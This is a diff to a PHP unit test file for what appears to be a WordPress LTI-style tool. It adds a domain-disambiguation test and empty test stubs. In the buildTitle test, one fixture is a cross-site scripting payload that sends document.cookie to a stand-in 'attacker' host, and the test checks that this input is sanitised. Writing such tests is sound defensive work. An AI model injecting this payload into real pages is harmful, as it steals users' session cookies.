@@ -154,10 +154,23 @@ class ToolTest extends \WP_UnitTestCase {
 		$this->assertFalse( $this->tool->validateRegistrationRequest() );
 	}
 
+	public function test_maybeDisambiguateDomain() {
+		$subdomain_happy_path    = 'https://biology201.example.com';
+		$subdirectory_happy_path = 'https://example.com/biol201';
+		$empty_path              = 'blort@example.com';
+		$disambiguate_path       = 'http://example.org';
+
+		$this->assertEquals( 'https://biology201.example.com/', $this->tool->maybeDisambiguateDomain( $subdomain_happy_path ) );
+		$this->assertEquals( 'https://example.com/biol201/', $this->tool->maybeDisambiguateDomain( $subdirectory_happy_path ) );
+		$this->assertEmpty( $this->tool->maybeDisambiguateDomain( $empty_path ) );
+		$this->assertEquals( 'http://example.org/1/', $this->tool->maybeDisambiguateDomain( $disambiguate_path ) );
+
+	}
+
 	public function test_buildTitle() {
 		$happy_path     = [ 'Course Name 657', '2352', 'Read this book!', '8932' ];
-		$empty_path1     = [ '', '4321', '', '1234' ];
-		$empty_path2     = [ 'BIO-201:microbiology', '4321', '', '1234' ];
+		$empty_path1    = [ '', '4321', '', '1234' ];
+		$empty_path2    = [ 'BIO-201:microbiology', '4321', '', '1234' ];
 		$markup_path    = [ '<b>Course Name 657</b>', '2352', '<span>Read this</span> book!', '8765' ];
 		$malicious_path = [
 			'<script>window.location=\'http://attacker/?cookie=\'+document.cookie</script>',
@@ -170,6 +183,14 @@ class ToolTest extends \WP_UnitTestCase {
 		$this->assertEquals( 'BIO-201:microbiology: Activity ID 1234', $this->tool->buildTitle( $empty_path2[0], $empty_path2[1], $empty_path2[2], $empty_path2[3] ) );
 		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $markup_path[0], $markup_path[1], $markup_path[2], $markup_path[3] ) );
 		$this->assertEquals( 'Untitled', $this->tool->buildTitle( $malicious_path[0], $malicious_path[1], $malicious_path[2], $malicious_path[3] ) );
+	}
+
+	public function test_createNewBook() {
+
+	}
+
+	public function test_fuzzyUserMatch() {
+
 	}
 
 }
